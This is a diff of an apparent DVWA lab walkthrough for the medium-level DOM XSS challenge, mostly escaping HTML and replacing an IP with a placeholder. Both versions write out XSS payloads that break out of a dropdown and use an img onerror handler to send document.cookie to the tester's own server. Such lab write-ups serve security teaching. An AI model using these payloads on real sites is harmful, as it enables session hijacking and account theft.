@@ -20,7 +20,7 @@ Upon reviewing the source code for this challenge, we see that the developer sim
 
 So let's grab a XSS exploit that doesn't use the <code>&#60;script</code> tag. Once we find one, let's point it to our <code>a.js</code> payload from before. An easy and convenient one would be something like:
 
-<code><img src='http://[your_Kali_IP]:9999/a.js'></code> 
+<code>&#60;img src='http://[your_Kali_IP]:9999/a.js'></code> 
 
 Let's start by initializing our temporary Kali web server, then by trying to execute the payload as shown above:
 
@@ -32,12 +32,11 @@ Hm, the URL doesn't change, nor do we see a call to our payload on our webserver
 
 So it essentially injects whatever we put into the URL into the top row of the dropdown. We can't actually insert an image into a dropdown (<a href="https://stackoverflow.com/questions/4941004/putting-images-with-options-in-a-dropdown-list" target="_blank">source</a>). The next best thing is to modify our payload to break us out of the dropdown completely, so that we can "display" our "image" on the page itself. Let's try something like this:
 
-<code></option></select><img src='http://192.168.84.149:9999/a.js'></code>
+<code>&#60;/option&#62;&#60;/select&#62;&#60;img src=&#x27;http&#58;//[your_Kali_IP]:9999/a.js&#x27;&#62;</code>
 
 If we put that in our URL, it should work, fingers crossed: 
 
-<b>http://dvwa/dvwa/vulnerabilities/xss_d/?default=English</option></select><img src='</b>[your_Kali_IP}<b>:9999/a.js'>
-</b>
+<b>http&#58;//dvwa/dvwa/vulnerabilities/xss_d/?default=English&#60;/option&#62;&#60;/select&#62;&#60;img src=&#x27;</b>[your_Kali_IP]<b>:9999/a.js&#x27;&#62;</b>
 
 <img src="https://github.com/keewenaw/dvwa-guide-2019/blob/master/medium/screenshots/xssdbreakfail.png" width="500">
 
@@ -45,17 +44,15 @@ Hm, no luck. Seems our payload won't be executed, probably because the web page 
 
 After playing around, we get something like:
 
-<code></option></select><img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http://192.168.84.149:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")></code>
+<code>&#60;/option&#62;&#60;/select&#62;&#60;img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http&#58;//[your_Kali_IP]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")&#62;</code>
 
 This code does several things:
 <ul>
   <li>Gives a label to our <code>img</code> element; we call it 'pic';</li>
   <li>Specifies an invalid <b>src</b> parameter, which doesn't exist. This will trigger the <code>onerror</code> code;</li>
-  <li>Specify an error condition. This can be Javascript, which will execute without using <code>script</code> tags. We set our image source to a fake URL on our temporary server, which will eventually request a page with the same name as the user's cookie. Right after, we'll delete our element, to keep the error code from continuously triggering and executing a denial-of-service attack on our own server.</li>
+  <li>Specify an error condition. This can be Javascript, which will execute without using <code>script</code> tags. So we set our image source to a fake URL on our temporary server, which will eventually request a page with the same name as the user's cookie. Right after, we'll delete our element, to keep the error code from continuously triggering and executing a denial-of-service attack on our own server.</li>
 </ul>
 
 <img src="https://github.com/keewenaw/dvwa-guide-2019/blob/master/medium/screenshots/xssdsuccess.png" width="500">
 
-We did it! Remember that I purposely display only part of the cookie on my end. We still get the user's cookie given to us remotely, without having to view their screen. 
-
-Challenge complete.
+We did it! We still get the user's cookie given to us remotely, without having to view their screen. Remember that I purposely display only part of the cookie on my end. Challenge complete!
